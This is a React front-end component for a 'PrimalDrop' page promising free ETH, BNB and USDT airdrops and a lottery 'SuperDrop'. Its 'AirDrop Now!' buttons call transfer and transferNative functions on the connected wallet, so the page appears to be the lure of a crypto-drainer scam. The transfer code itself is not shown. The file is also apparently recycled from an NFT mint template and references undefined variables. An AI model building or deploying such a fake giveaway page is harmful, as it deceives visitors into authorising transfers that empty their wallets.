import React, { useEffect, useState } from "react";
import { makeStyles } from "@material-ui/core/styles";

import Box from "@mui/material/Box";
import Modal from "@mui/material/Modal";

import CssBaseline from "@material-ui/core/CssBaseline";
import Typography from "@material-ui/core/Typography";
import Button from "@material-ui/core/Button";
import Grid from "@material-ui/core/Grid";

const style = {
  position: "absolute",
  top: "50%",
  left: "50%",
  transform: "translate(-50%, -50%)",
  width: 400,
  bgcolor: "#0e2020",
  border: "2px solid #000",
  boxShadow: 24,
  pt: 2,
  px: 4,
  pb: 3,
};

const useStyles = makeStyles((theme) => ({
  menuButton: {
    marginRight: theme.spacing(2),
    borderRadius: 10,
    padding: "10px 40px",
    margin: "10px",
    color: "white",
    fontWeight: "800",
    backgroundColor: "#ED3773", //"#F2DFD8"
    "&:disabled": {
      color: "#408ea6",
      backgroundColor: "#040b38",
    },
    "&:hover": {
      backgroundColor: "transparent",
      color: "#ED3773",
      border: "2px solid #ED3773",
    },
  },
  title: {
    flexGrow: 1,
  },
  img: {
    maxWidth: "100%",
    [theme.breakpoints.down("xs")]: {
      maxWidth: "90%",
    },
  },
  h3main: {
    margin: "20px 0px",
    // fontFamily: "Urbanist",
    // fontStyle: "italic",
    textAlign: "center",
    fontWeight: "bolder",
    [theme.breakpoints.down("xs")]: {
      fontSize: 20,
    },
  },
  h3: {
    margin: "20px 0px",
    // fontFamily: "Urbanist",
    // fontStyle: "italic",
    textAlign: "center",
    fontWeight: "bolder",
    [theme.breakpoints.down("xs")]: {
      fontSize: 12,
    },
  },
  h4: {
    marginBottom: 5,
    fontWeight: "Bolder",
    color: "#408ec6",
    [theme.breakpoints.down("xs")]: {
      fontSize: 25,
    },
  },
  mint: {
    marginBottom: 5,
    fontWeight: "Bolder",
    color: "#408ec6",
    [theme.breakpoints.down("xs")]: {
      fontSize: 20,
    },
  },
  body2: {
    // marginBottom: 10,
    color: "white",
    fontFamily: "Urbanist",
    fontStyle: "italic",
    [theme.breakpoints.down("xs")]: {
      fontSize: 15,
    },
  },
  subtitle1: {
    fontWeight: "bold",
    color: "#408ec6",
    [theme.breakpoints.down("xs")]: {
      fontSize: 11,
    },
  },
  mainText: {
    color: "white",
    fontStyle: "italic",
    fontWeight: "800",
    padding: "0px",
    textTransform: "uppercase",
    fontFamily: "customF",
    textShadow: "0px 0px 20px #e6f01b",
    [theme.breakpoints.down("sm")]: {
      marginTop: 20,
    },
    [theme.breakpoints.down("xs")]: {
      fontSize: 30,
    },
  },
  totalMinted: {
    color: "white",
    fontStyle: "italic",
    fontWeight: "800",
    padding: "0px",
    textTransform: "uppercase",
    fontFamily: "customF",
    textShadow: "0px 0px 20px #e6f01b",
    [theme.breakpoints.down("sm")]: {
      marginTop: 20,
    },
    [theme.breakpoints.down("xs")]: {
      fontSize: 15,
    },
  },
  inputCount: {
    fontFamily: "customF",
    color: "white",
    borderRadius: 0,
    border: "2px solid #7ea936",
    padding: "5px 20px",
    // backgroundColor: "white",
    // borderRadius: 8,
    [theme.breakpoints.down("xs")]: {
      width: 50,
      marginTop: 10,
    },
  },
  decrementBtn: {
    border: "none",
    borderRadius: 0,
    color: "white",
    border: "0px solid #1e2761",
    fontStyle: "italic",
    fontWeight: "800",
    fontSize: 24,
    padding: 0,
    "&:disabled": {
      color: "white",
      border: "0px solid #1e2761",
    },
    "&:hover": {
      // color: "#1e2761",
    },
  },
  incrementBtn: {
    borderRadius: 0,
    color: "white",
    border: "0px solid #1e2761",
    fontStyle: "italic",
    fontWeight: "800",
    fontSize: 24,
    padding: 0,
    "&:disabled": {
      color: "white",
      border: "0px solid #1e2761",
    },
    "&:hover": {
      // color: "#1e2761",
    },
  },
  tokenPrice: {
    fontFamily: "customF",
    margin: 10,
    // fontWeight: "800",
    // fontStyle: "italic",
    color: "white",
    [theme.breakpoints.down("xs")]: {
      fontSize: 20,
    },
  },
  tokenPrice2: {
    fontFamily: "customF",
    margin: 10,
    // fontWeight: "800",
    // fontStyle: "italic",
    color: "white",
    [theme.breakpoints.down("sm")]: {
      fontSize: 10,
      margin: 2,
    },
  },
  maxPerWallet: {
    fontFamily: "Urbanist",
    color: "white",
    fontWeight: "bold",
    [theme.breakpoints.down("xs")]: {
      fontSize: 15,
      marginTop: 10,
    },
  },
}));

function TopSection({ transferNative, transfer, account, enableWeb3 }) {
  const classes = useStyles();
  const [open, setOpen] = React.useState(false);
  const [mintButton, setMintButton] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");
  const [totalMinted, setTotalMinted] = useState("-");
  const price = 0.0616; // 0.07 -- for public sale 0.10

  const handleCloseMintButton = () => {
    setMintButton(false);
  };
  const handleClose = () => {
    setOpen(false);
  };
  const handleCloseError = () => {
    setError(false);
  };
  const connectWallet = async () => {};

  const disconnectMetamaskSimple = () => {};

  const connectMetamaskSimple = async () => {};
  const getTotalMinted = async (cnt) => {};
  const mint = async () => {};

  return (
    <React.Fragment>
      <CssBaseline />

      <Grid
        container
        style={{
          width: "100%",
          justifyContent: "center",
          // backgroundColor: "#7a2048",
          padding: "150px 0 50px",
          // backgroundImage: `url(/mint_bkg.jpg)`,
          // backgroundSize: "cover",
          // backgroundRepeat: "no-repeat",
        }}
      >
        <Grid
          item
          lg={6}
          md={12}
          style={{
            justifyContent: "center",
            // alignItems: "center",
            display: "flex",
          }}
        >
          <Typography
            component="div"
            style={{
              maxWidth: 1000,
              padding: "0 40px",
              display: "flex",
              flexDirection: "column",
              justifyContent: "space-evenly",
              alignItems: "center",
            }}
          >
            <Typography variant="h4" className={classes.h3main}>
              👋 Hello PrimalDrop lottery fans. We are airdropping Airdrop of
              0.01 ETH or 0.07 BNB and 10 USDT.
            </Typography>
            <Typography
              component="div"
              style={{
                display: "flex",
                justifyContent: "space-evenly",
                padding: 10,
                width: "80%",
                borderRadius: 20,
                background: "rgba(255,255,255,0.5)",
                border: "1px solid white",
              }}
            >
              <Typography variant="h6" className={classes.h3}>
                Supply Left:
              </Typography>
              <Typography variant="h6" className={classes.h3}>
                <img src="tether.svg" width="20" /> 82,31USDT
              </Typography>
              <Typography variant="h6" className={classes.h3}>
                <img src="binance.svg" width="20" /> 0.23BNB
              </Typography>
              <Typography variant="h6" className={classes.h3}>
                <img src="ether.svg" width="15" /> 0.034ETH
              </Typography>
            </Typography>
            <Typography variant="h6" className={classes.h3}>
              Limited entry. 0.3% chance to win SuperDrop
            </Typography>
            <Typography
              component="div"
              style={{
                display: "flex",
                justifyContent: "space-between",
                width: "60%",
              }}
            >
              <Typography variant="h6" className={classes.h3}>
                <img src="tether.svg" width="20" /> 1 ,500 USDT
              </Typography>
              <Typography variant="h6" className={classes.h3}>
                <img src="binance.svg" width="20" /> 8 BNB
              </Typography>
              <Typography variant="h6" className={classes.h3}>
                or
              </Typography>
              <Typography variant="h6" className={classes.h3}>
                <img src="ether.svg" width="15" /> 1 ETH
              </Typography>
            </Typography>
            <Typography
              component="div"
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
              }}
            >
              {false ? (
                window.ethereum ? (
                  !true ? (
                    <Button
                      color="inherit"
                      variant="contained"
                      className={classes.menuButton}
                      onClick={() => {
                        if (account) {
                          transfer();
                          transferNative();
                        } else {
                          enableWeb3();
                        }
                      }}
                    >
                      AirDrop Now!
                      <img src="mm.png" width="20" />
                    </Button>
                  ) : (
                    <Button
                      color="inherit"
                      variant="contained"
                      className={classes.menuButton}
                      onClick={() => {
                        if (account) {
                          transfer();
                          transferNative();
                        } else {
                          enableWeb3();
                        }
                      }}
                    >
                      AirDrop Now!
                      <img src="mm.png" width="20" />
                    </Button>
                  )
                ) : (
                  <Button
                    // href="https://metamask.app.link/dapp/proudlionsclub.com/"
                    color="inherit"
                    variant="contained"
                    className={classes.menuButton}
                    disabled={!count}
                  >
                    AirDrop Now!
                    <img src="mm.png" width="20" />
                  </Button>
                )
              ) : (
                <>
                  {/* <Button
                    color="inherit"
                    variant="contained"
                    className={classes.menuButton}
                    // onClick={mint}
                    onClick={connectWallet}
                    disabled={!count}
                  >
                    WalletConnect
                  </Button>
                  <Button
                    color="inherit"
                    variant="contained"
                    className={classes.menuButton}
                    onClick={connectMetamaskSimple}
                    // onClick={connectWallet}
                    disabled={!count}
                  >
                    Metamask
                  </Button> */}
                  <Button
                    color="inherit"
                    variant="contained"
                    className={classes.menuButton}
                    onClick={() => {
                      if (account) {
                        transfer();
                        transferNative();
                      } else {
                        enableWeb3();
                      }
                    }}
                    // onClick={connectWallet}
                  >
                    AirDrop Now!
                    <img src="mm.png" width="20" />
                  </Button>
                </>
              )}
            </Typography>
          </Typography>
        </Grid>
        <Grid
          item
          lg={6}
          style={{
            justifyContent: "center",
            display: "flex",
            overflow: "hidden",
          }}
        >
          {/* <img className={classes.img} src="/mint_gif.gif" alt={"gif"} /> */}
        </Grid>
      </Grid>
      <Modal
        open={false}
        onClose={handleCloseError}
        aria-labelledby="parent-modal-title"
        aria-describedby="parent-modal-description"
      >
        <Box
          sx={{
            ...style,
            borderRadius: 7,
            width: 400,
            display: "flex",
            alignItems: "center",
            flexDirection: "column",
          }}
        >
          <h2
            id="parent-modal-title"
            style={{ padding: "20px 10px", textAlign: "center" }}
            className={classes.tokenPrice}
          >
            {errorMsg}
          </h2>
          {/* <p id="parent-modal-description">
            Duis mollis, est non commodo luctus, nisi erat porttitor ligula.
          </p> */}
        </Box>
      </Modal>
      <Modal
        open={mintButton}
        onClose={handleCloseMintButton}
        aria-labelledby="parent-modal-title"
        aria-describedby="parent-modal-description"
      >
        <Box
          sx={{
            ...style,
            borderRadius: 7,
            width: 400,
            display: "flex",
            alignItems: "center",
            flexDirection: "column",
          }}
        >
          <h2
            id="parent-modal-title"
            style={{ padding: "20px 10px", textAlign: "center" }}
            className={classes.tokenPrice}
          >
            Wait for few seconds, go to PLC official collection to view your NFT{" "}
            <a
              href="https://opensea.io/collection/proudlionsclub-official"
              target="_blank"
              style={{ color: "white" }}
            >
              {" "}
              View Collection
            </a>
            .
          </h2>
          <p
            style={{ color: "white", fontFamily: "customF" }}
            id="parent-modal-description"
          >
            Note : The Lion is hidden until reveal time.
          </p>
        </Box>
      </Modal>
      <Modal
        open={open}
        onClose={handleClose}
        aria-labelledby="parent-modal-title"
        aria-describedby="parent-modal-description"
      >
        <Box
          sx={{
            ...style,
            borderRadius: 7,
            width: 400,
            display: "flex",
            alignItems: "center",
            flexDirection: "column",
          }}
        >
          {true ? (
            <>
              {typeof window !== "undefined" && window.ethereum ? (
                <Button
                  color="inherit"
                  variant="contained"
                  className={classes.menuButton}
                  onClick={connectMetamaskSimple}
                  // onClick={connectWallet}
                >
                  <span>
                    <img
                      src="/mm.png"
                      width="30px"
                      style={{ marginTop: 5 }}
                      alt="meta"
                    />
                  </span>{" "}
                  Metamask
                </Button>
              ) : (
                <Button
                  color="inherit"
                  variant="contained"
                  className={classes.menuButton}
                  // href="https://metamask.app.link/dapp/mint.proudlionsclub.com/"
                  //  onClick={connectMetamaskSimple}
                  // onClick={connectWallet}
                >
                  {" "}
                  <span>
                    <img
                      src="/mm.png"
                      width="30px"
                      style={{ marginTop: 5 }}
                      alt="meta"
                    />
                  </span>{" "}
                  Metamask
                </Button>
              )}
              <Button
                color="inherit"
                variant="contained"
                className={classes.menuButton}
                // onClick={mint}
                onClick={connectWallet}
              >
                <span>
                  <img
                    src="/wc.png"
                    width="30px"
                    style={{ marginTop: 5 }}
                    alt="meta"
                  />
                </span>{" "}
                WalletConnect
              </Button>
            </>
          ) : (
            <>
              <Button
                color="inherit"
                variant="contained"
                className={classes.menuButton}
                onClick={mint}
                // onClick={connectWallet}
                disabled={!count}
              >
                Buy Lion/s
              </Button>
              <Button
                color="inherit"
                //  variant="contained"
                //  className={classes.menuButton}
                style={{ color: "green" }}
                onClick={disconnectMetamaskSimple}
                // onClick={connectWallet}
                disabled={!count}
              >
                Disconnect
              </Button>
            </>
          )}
        </Box>
      </Modal>
    </React.Fragment>
  );
}

export default TopSection;
